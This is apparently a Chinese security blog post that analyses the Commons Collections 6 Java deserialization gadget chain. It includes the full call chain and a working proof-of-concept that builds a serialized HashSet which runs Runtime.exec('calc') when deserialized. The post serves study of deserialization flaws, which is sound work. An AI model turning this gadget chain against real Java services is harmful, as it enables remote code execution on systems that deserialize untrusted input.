@@ -1,0 +1,134 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Java安全-CommonCollection6链 | XZLang</title><meta name="description" content="利用链分析利用链： 123456789101112Gadget chain:        java.io.ObjectInputStream.readObject()            java.util.HashSet.readObject()                java.util.HashMap.put()                java.util.HashMap.h"><meta name="keywords" content="Java,反序列化"><meta name="author" content="XZLang"><meta name="copyright" content="XZLang"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="Java安全-CommonCollection6链"><meta property="og:url" content="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/"><meta property="og:site_name" content="XZLang"><meta property="og:description" content="利用链分析利用链： 123456789101112Gadget chain:        java.io.ObjectInputStream.readObject()            java.util.HashSet.readObject()                java.util.HashMap.put()                java.util.HashMap.h"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2022-03-04T13:35:54.000Z"><meta property="article:modified_time" content="2022-03-04T13:36:49.978Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.0.2',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime_unit: 'days',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2022-03-04 21:36:49'
+}</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="XZLang" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">42</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">10</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">问题分析：</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">XZLang</a></span><span class="pull-right menus"><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Java安全-CommonCollection6链</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-04T13:35:54.000Z" title="Created 2022-03-04 21:35:54">2022-03-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-03-04T13:36:49.978Z" title="Updated 2022-03-04 21:36:49">2022-03-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>利用链：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>和CC1相比，没有使用<code>AnnotationInvocationHandler</code>，但同样都是想办法调用了<code>LazyMap#get()</code>从而执行了<code>transform</code>，达到利用目的。</p>
+<p>而<code>TiedMapEntry</code>的<code>getValue()</code>调用了<code>get()</code>。（这里的map是构造好的<code>LazyMap</code>对象）<code>hashCode()</code>中调用了<code>getValue()</code>：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111232159039.png" alt="image-20220111232159039"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111232210606.png" alt="image-20220111232210606"></p>
+<p><code>HashSet.readObject()</code>中调用了<code>HashMap.put()</code>:</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233120936.png" alt="image-20220111233120936"></p>
+<p>进而调用<code>HashMap.hash()</code>，这要求这里的map是<code>HashMap</code>对象</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233215114.png" alt="image-20220111233215114"></p>
+<p>然后调用<code>hashcode()</code>：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233319579.png" alt="image-20220111233319579"></p>
+<p>这里要求k对象是<code>TiedMapEntry</code>对象</p>
+<p>所以在整个POC中需要三次传参，将构造好的<code>lazyMap</code>传给<code>TiedMapEntry</code>，将<code>TiedMapEntry</code>传给<code>HashMap</code>，将这个<code>HashMap</code>传给<code>HashSet</code>，然后返回这个<code>HashSet</code></p>
+<p>根据这个流程，可以得到以下的POC：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer Testtransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">            Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line">            TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            HashSet hashSet=<span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">            hashSet.add(tiedMapEntry);</span><br><span class="line">            lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">            Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(Testtransformer, transformers);</span><br><span class="line"></span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(hashSet);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>后面还调用了<code>lazyMap.remove</code>方法将<code>test1</code>给移除，这是因为在执行的时候如果没使用<code>lazyMap.remove</code>将<code>test1</code>给移除掉将不会进入到该判断语句里面去。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111233913811.png" alt="image-20220111233913811"></p>
+<h2 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h2><p>为什么会造成这里的key是test1呢，这要从<code>hashSet.add(tiedMapEntry);</code>这一行代码开始分析</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235040179.png" alt="image-20220111235040179"></p>
+<p>调用了HashMap的put方法</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235238824.png" alt="image-20220111235238824"></p>
+<p>然后调用了<code>hash(key)</code>这里的key是<code>tiedMapEntry</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235335732.png" alt="image-20220111235335732"></p>
+<p><code>tiedMapEntry</code>的<code>hashCode</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235406341.png" alt="image-20220111235406341"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235507418.png" alt="image-20220111235507418"></p>
+<p>这里的map是<code>lazyMap</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20220111235605431.png" alt="image-20220111235605431"></p>
+<p>然后<code>lazyMap</code>的get函数直接调用了put函数，直接把key也就是test1给put进去了，所以反序列号的时候就因为key不为空导致无法触发漏洞。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">XZLang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/">http://yoursite.com/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection6%E9%93%BE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/04/Java%E5%AE%89%E5%85%A8-CommonCollection5%E9%93%BE/"><img class="next-cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Java安全-CommonCollection5链</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2022/03/01/Java安全-CommonCollection链/" title="Java安全-CommonCollection1链"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-01</div><div class="relatedPosts_title">Java安全-CommonCollection1链</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/11/Java安全初步/" title="Java安全初步"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-11</div><div class="relatedPosts_title">Java安全初步</div></div></a></div><div class="relatedPosts_item"><a href="/2022/03/02/Java安全-CommonCollection2链/" title="Java安全-CommonCollection2链"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-02</div><div class="relatedPosts_title">Java安全-CommonCollection2链</div></div></a></div><div class="relatedPosts_item"><a href="/2022/03/02/Java安全-JNDI注入/" title="Java安全-JNDI注入"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-02</div><div class="relatedPosts_title">Java安全-JNDI注入</div></div></a></div><div class="relatedPosts_item"><a href="/2022/03/04/Java安全-CommonCollection4链/" title="Java安全-CommonCollection4链"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-04</div><div class="relatedPosts_title">Java安全-CommonCollection4链</div></div></a></div><div class="relatedPosts_item"><a href="/2022/03/04/Java安全-CommonCollection5链/" title="Java安全-CommonCollection5链"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-04</div><div class="relatedPosts_title">Java安全-CommonCollection5链</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By XZLang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="Increase Font Size"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="Decrease Font Size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
